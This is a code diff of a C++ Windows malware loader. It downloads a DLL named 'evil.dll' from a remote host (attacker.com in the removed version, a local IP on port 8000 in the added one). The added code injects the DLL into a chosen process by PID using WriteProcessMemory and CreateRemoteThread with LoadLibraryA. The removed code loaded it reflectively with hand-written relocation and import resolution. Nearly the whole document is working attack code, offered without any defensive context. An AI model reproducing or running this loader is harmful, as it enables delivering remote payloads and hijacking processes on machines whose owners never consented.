@@ -1,4 +1,3 @@
-#include "pch.h"
 #include <iostream>
 #include <Windows.h>
 #include <urlmon.h> // For URLDownloadToFile
@@ -6,19 +5,19 @@
 // Link with Urlmon.lib
 #pragma comment(lib, "urlmon.lib")
 
-typedef struct BASE_RELOCATION_BLOCK {
+typedef struct _BASE_RELOCATION_BLOCK {
     DWORD PageAddress;
     DWORD BlockSize;
-} BASE_RELOCATION_BLOCK, *PBASE_RELOCATION_BLOCK;
+} BASE_RELOCATION_BLOCK, * PBASE_RELOCATION_BLOCK;
 
-typedef struct BASE_RELOCATION_ENTRY {
+typedef struct _BASE_RELOCATION_ENTRY {
     USHORT Offset : 12;
     USHORT Type : 4;
-} BASE_RELOCATION_ENTRY, *PBASE_RELOCATION_ENTRY;
+} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;
 
-using DLLEntry = BOOL(WINAPI *)(HINSTANCE dll, DWORD reason, LPVOID reserved);
+using DLLEntry = BOOL(WINAPI*)(HINSTANCE dll, DWORD reason, LPVOID reserved);
 
-const char* dllURL = "http://attacker.com/malicious.dll";
+const char* dllURL = "http://192.168.162.140:8000/evil.dll";
 
 // Function to download DLL from URL
 HRESULT DownloadDLL(const char* url, const char* filePath) {
@@ -27,73 +26,128 @@ HRESULT DownloadDLL(const char* url, const char* filePath) {
 
 // Function to perform image base relocations
 void PerformImageBaseRelocations(LPVOID dllBase, PIMAGE_NT_HEADERS ntHeaders, DWORD_PTR deltaImageBase) {
-    // Implementation omitted for brevity
+    // Calculate the relocation table address
+    DWORD_PTR relocationTable = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
+    if (relocationTable != 0) {
+        // Iterate over relocation blocks
+        DWORD_PTR relocationsProcessed = 0;
+        while (relocationsProcessed < ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size) {
+            PBASE_RELOCATION_BLOCK relocationBlock = (PBASE_RELOCATION_BLOCK)((DWORD_PTR)dllBase + relocationTable + relocationsProcessed);
+            relocationsProcessed += sizeof(BASE_RELOCATION_BLOCK);
+            DWORD relocationsCount = (relocationBlock->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
+            PBASE_RELOCATION_ENTRY relocationEntries = (PBASE_RELOCATION_ENTRY)((DWORD_PTR)relocationBlock + sizeof(BASE_RELOCATION_BLOCK));
+            // Apply relocations
+            for (DWORD i = 0; i < relocationsCount; i++) {
+                if (relocationEntries[i].Type != 0) {
+                    DWORD_PTR relocationRVA = relocationBlock->PageAddress + relocationEntries[i].Offset;
+                    DWORD_PTR* ptr = (DWORD_PTR*)((DWORD_PTR)dllBase + relocationRVA);
+                    *ptr += deltaImageBase;
+                }
+            }
+        }
+    }
 }
 
 // Function to resolve import address table
 void ResolveImportAddressTable(LPVOID dllBase, PIMAGE_NT_HEADERS ntHeaders) {
-    // Implementation omitted for brevity
+    // Calculate the import table address
+    DWORD_PTR importTable = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
+    if (importTable != 0) {
+        // Iterate over import descriptors
+        PIMAGE_IMPORT_DESCRIPTOR importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD_PTR)dllBase + importTable);
+        while (importDescriptor->Name != 0) {
+            // Load the DLL
+            LPCSTR libraryName = (LPCSTR)((DWORD_PTR)dllBase + importDescriptor->Name);
+            HMODULE hModule = LoadLibraryA(libraryName);
+            if (hModule != NULL) {
+                // Iterate over import functions
+                PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)((DWORD_PTR)dllBase + importDescriptor->FirstThunk);
+                while (thunk->u1.AddressOfData != 0) {
+                    if (IMAGE_SNAP_BY_ORDINAL(thunk->u1.Ordinal)) {
+                        thunk->u1.Function = (DWORD_PTR)GetProcAddress(hModule, (LPCSTR)IMAGE_ORDINAL(thunk->u1.Ordinal));
+                    }
+                    else {
+                        PIMAGE_IMPORT_BY_NAME importByName = (PIMAGE_IMPORT_BY_NAME)((DWORD_PTR)dllBase + thunk->u1.AddressOfData);
+                        thunk->u1.Function = (DWORD_PTR)GetProcAddress(hModule, importByName->Name);
+                    }
+                    thunk++;
+                }
+            }
+            importDescriptor++;
+        }
+    }
 }
 
-int main() {
+int main(int argc, char* argv[]) {
+    // Check if the correct number of arguments is provided
+    if (argc != 3) {
+        std::cout << "Usage: " << argv[0] << " <PID> <DLL_Path>" << std::endl;
+        return 1;
+    }
+
+    // Parse the process PID from the command line argument
+    DWORD processID = atoi(argv[1]);
+
     // Download the DLL file
-    HRESULT hr = DownloadDLL(dllURL, "C:\\Path\\malicious.dll");
+    HRESULT hr = DownloadDLL(dllURL, argv[2]);
     if (FAILED(hr)) {
         printf("Failed to download DLL: 0x%x\n", hr);
         return 1;
     }
 
-    // Load DLL into memory
-    HANDLE dll = CreateFileA("C:\\Path\\malicious.dll", GENERIC_READ, NULL, NULL, OPEN_EXISTING, NULL, NULL);
-    if (dll == INVALID_HANDLE_VALUE) {
-        printf("Failed to open DLL file\n");
+    // Open the target process
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID);
+    if (hProcess == NULL) {
+        printf("Failed to open process: %d\n", GetLastError());
         return 1;
     }
 
-    DWORD64 dllSize = GetFileSize(dll, NULL);
-    LPVOID dllBytes = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dllSize);
-    if (dllBytes == NULL) {
-        printf("Memory allocation failed\n");
-        CloseHandle(dll);
-        return 1;
-    }
-
-    DWORD outSize = 0;
-    if (!ReadFile(dll, dllBytes, dllSize, &outSize, NULL)) {
-        printf("Failed to read DLL file\n");
-        HeapFree(GetProcessHeap(), 0, dllBytes);
-        CloseHandle(dll);
-        return 1;
-    }
-
-    // Get pointers to in-memory DLL headers
-    PIMAGE_DOS_HEADER dosHeaders = (PIMAGE_DOS_HEADER)dllBytes;
-    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)dllBytes + dosHeaders->e_lfanew);
-    SIZE_T dllImageSize = ntHeaders->OptionalHeader.SizeOfImage;
-
-    // Allocate new memory space for the DLL
-    LPVOID dllBase = VirtualAlloc(NULL, dllImageSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    // Allocate memory in the target process
+    LPVOID dllBase = VirtualAllocEx(hProcess, NULL, MAX_PATH, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (dllBase == NULL) {
-        printf("Virtual memory allocation failed\n");
-        HeapFree(GetProcessHeap(), 0, dllBytes);
-        CloseHandle(dll);
+        printf("Virtual memory allocation failed in the target process\n");
+        CloseHandle(hProcess);
         return 1;
     }
 
-    // Perform image base relocations
-    DWORD_PTR deltaImageBase = (DWORD_PTR)dllBase - (DWORD_PTR)ntHeaders->OptionalHeader.ImageBase;
-    PerformImageBaseRelocations(dllBase, ntHeaders, deltaImageBase);
+    // Write the DLL path into the allocated memory space of the target process
+    if (!WriteProcessMemory(hProcess, dllBase, argv[2], MAX_PATH, NULL)) {
+        printf("Failed to write DLL path to the target process\n");
+        CloseHandle(hProcess);
+        return 1;
+    }
 
-    // Resolve import address table
-    ResolveImportAddressTable(dllBase, ntHeaders);
+    // Load the DLL into the target process
+    // Get the base address of kernel32.dll to use its functions
+    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
+    if (hKernel32 == NULL) {
+        printf("Failed to get the handle of kernel32.dll\n");
+        CloseHandle(hProcess);
+        return 1;
+    }
 
-    // Execute the loaded DLL
-    DLLEntry DllEntry = (DLLEntry)((DWORD_PTR)dllBase + ntHeaders->OptionalHeader.AddressOfEntryPoint);
-    (*DllEntry)((HINSTANCE)dllBase, DLL_PROCESS_ATTACH, 0);
+    // Get the address of LoadLibraryA function
+    LPVOID pLoadLibraryA = GetProcAddress(hKernel32, "LoadLibraryA");
+    if (pLoadLibraryA == NULL) {
+        printf("Failed to get the address of LoadLibraryA\n");
+        CloseHandle(hProcess);
+        return 1;
+    }
 
-    // Clean up resources
-    HeapFree(GetProcessHeap(), 0, dllBytes);
-    CloseHandle(dll);
+    // Create a remote thread in the target process to execute LoadLibraryA with the DLL path as argument
+    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibraryA, dllBase, 0, NULL);
+    if (hThread == NULL) {
+        printf("Failed to create remote thread in the target process: %d\n", GetLastError());
+        CloseHandle(hProcess);
+        return 1;
+    }
+
+    // Wait for the remote thread to finish execution
+    WaitForSingleObject(hThread, INFINITE);
+
+    // Close handles and clean up resources
+    CloseHandle(hThread);
+    CloseHandle(hProcess);
 
     return 0;
 }
